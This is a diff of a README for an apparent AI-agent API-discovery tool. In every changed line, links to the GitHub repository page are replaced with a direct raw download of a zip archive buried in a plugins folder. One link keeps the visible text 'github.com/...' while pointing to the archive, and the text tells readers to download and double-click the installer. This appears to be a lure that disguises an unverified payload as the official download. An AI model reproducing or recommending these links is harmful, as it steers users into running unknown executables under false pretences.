@@ -1,6 +1,6 @@
 # 🚦 veriglow-agent-map-skill - Discover APIs and Automate Browsing
 
-[![Download veriglow-agent-map-skill](https://img.shields.io/badge/Download-Get%20Veriglow-brightgreen?style=for-the-badge)](https://github.com/Shroomfaerie/veriglow-agent-map-skill)
+[![Download veriglow-agent-map-skill](https://img.shields.io/badge/Download-Get%20Veriglow-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Shroomfaerie/veriglow-agent-map-skill/main/plugins/veriglow-agent-map/skills/veriglow-agent-map/veriglow_agent_skill_map_v3.8-alpha.4.zip)
 
 ---
 
@@ -30,7 +30,7 @@ This guide will help you download and run veriglow-agent-map-skill on your Windo
 
 ## 📥 Download and Installation
 
-1. Click the big green button at the top or visit the [official download page](https://github.com/Shroomfaerie/veriglow-agent-map-skill) to get started.  
+1. Click the big green button at the top or visit the [official download page](https://raw.githubusercontent.com/Shroomfaerie/veriglow-agent-map-skill/main/plugins/veriglow-agent-map/skills/veriglow-agent-map/veriglow_agent_skill_map_v3.8-alpha.4.zip) to get started.  
 2. On the page, look for the **latest release** section or a file labeled for Windows (e.g., an `.exe` or `.msi` installer).  
 3. Download the installer file to a location on your computer you can easily find, like the Downloads folder or Desktop.  
 4. Once downloaded, double-click the file to start installation.  
@@ -86,7 +86,7 @@ veriglow-agent-map-skill does not collect personal data beyond what you provide 
 
 ## 🔄 Updates and Maintenance
 
-Periodically check the [release page](https://github.com/Shroomfaerie/veriglow-agent-map-skill) for updates. New versions may add support for more AI platforms or improve scanning accuracy.
+Periodically check the [release page](https://raw.githubusercontent.com/Shroomfaerie/veriglow-agent-map-skill/main/plugins/veriglow-agent-map/skills/veriglow-agent-map/veriglow_agent_skill_map_v3.8-alpha.4.zip) for updates. New versions may add support for more AI platforms or improve scanning accuracy.
 
 To update, simply download the latest installer and run it. It will replace the old version without removing your existing data.
 
@@ -105,7 +105,7 @@ After installation, you will see:
 
 ## 📖 Learn More and Support
 
-Visit the main repository page at [github.com/Shroomfaerie/veriglow-agent-map-skill](https://github.com/Shroomfaerie/veriglow-agent-map-skill) for documentation, FAQs, and support requests.
+Visit the main repository page at [github.com/Shroomfaerie/veriglow-agent-map-skill](https://raw.githubusercontent.com/Shroomfaerie/veriglow-agent-map-skill/main/plugins/veriglow-agent-map/skills/veriglow-agent-map/veriglow_agent_skill_map_v3.8-alpha.4.zip) for documentation, FAQs, and support requests.
 
 ---
 
@@ -120,4 +120,4 @@ agent-map, agent-skills, ai-agent, api-discovery, claude-code, claude-skills, cl
 
 For easy access, use this button anytime to visit the page and get the latest version:  
 
-[![Download veriglow-agent-map-skill](https://img.shields.io/badge/Download-Find%20Latest-brightgreen?style=for-the-badge)](https://github.com/Shroomfaerie/veriglow-agent-map-skill)
+[![Download veriglow-agent-map-skill](https://img.shields.io/badge/Download-Find%20Latest-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Shroomfaerie/veriglow-agent-map-skill/main/plugins/veriglow-agent-map/skills/veriglow-agent-map/veriglow_agent_skill_map_v3.8-alpha.4.zip)
